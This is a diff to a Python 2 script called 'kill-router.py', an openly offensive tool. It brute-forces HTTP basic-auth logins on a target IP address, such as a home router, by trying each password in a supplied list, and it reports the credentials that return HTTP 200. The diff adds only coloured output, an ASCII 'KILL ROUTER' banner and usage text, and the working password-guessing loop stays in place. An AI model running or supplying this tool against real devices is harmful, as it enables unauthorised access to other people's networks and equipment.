@@ -1,10 +1,10 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-import urllib2
+
 import requests
-import getopt
 import sys
 import argparse
+from termcolor import colored
 
 
 
@@ -18,22 +18,46 @@ def bruteforce(target,passlist,username):
     fd = open(passlist, 'rw')
     passwords = fd.readlines()
     i = 0
+    print ""
+    print colored("=======================[STARTING TEST]=======================",'yellow', attrs=['bold'])
+    print ""
     for password in passwords:
         i = i + 1
         password = password.rstrip()
         test = requests.get('http://'+target, auth=(username, password))
         code = test.status_code
-        print '[%s] - TESTING USER: %s AND PASS %s' % (i,username,password)
+        print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password)
         if code == 200:
-            print '[!] - ::LOGIN FOUNDED::'
-            print '[!] - ::USER[%s] AND PASS[%s]' % (username, password)
+            print ""
+            print colored("=======================[LOGIN FOUNDED]=======================", 'yellow', attrs=['bold'])
+            print ""
+            print colored("=============================================================", 'yellow', attrs=['bold'])
+            print colored("              [  :: USER[%s] AND PASS[%s]  ]                 ", 'yellow', attrs=['bold']) % (username, password)
+            print colored("=============================================================", 'yellow', attrs=['bold'])
+
             sys.exit()
         else:
             pass
 
 
 def usage():
-    print "Usage: kill-router.py -t 192.168.0.1 -u admin -p passlist.txt"
+    print colored("""
+
+    ██ ▄█▀ ██▓ ██▓     ██▓        ██▀███   ▒█████   █    ██ ▄▄▄█████▓▓█████  ██▀███
+    ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
+   ▓███▄░ ▒██▒▒██░    ▒██░       ▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
+   ▓██ █▄ ░██░▒██░    ▒██░       ▒██▀▀█▄  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
+   ▒██▒ █▄░██░░██████▒░██████▒   ░██▓ ▒██▒░ ████▓▒░▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
+   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
+   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
+   ░ ░░ ░  ▒ ░  ░ ░     ░ ░        ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░   ░         ░     ░░   ░
+   ░  ░    ░      ░  ░    ░  ░      ░         ░ ░     ░                 ░  ░   ░
+
+
+    """, 'red', attrs=['bold'])
+
+    print colored("[!] Usage: ./kill-router.py -t [TARGET IP] -u [USER TO TEST] -p [PATH TO PASSLIST]", 'red', attrs=['bold'])
+    print colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -u admin -p passlist.txt", 'red', attrs=['bold'])
 
 
 
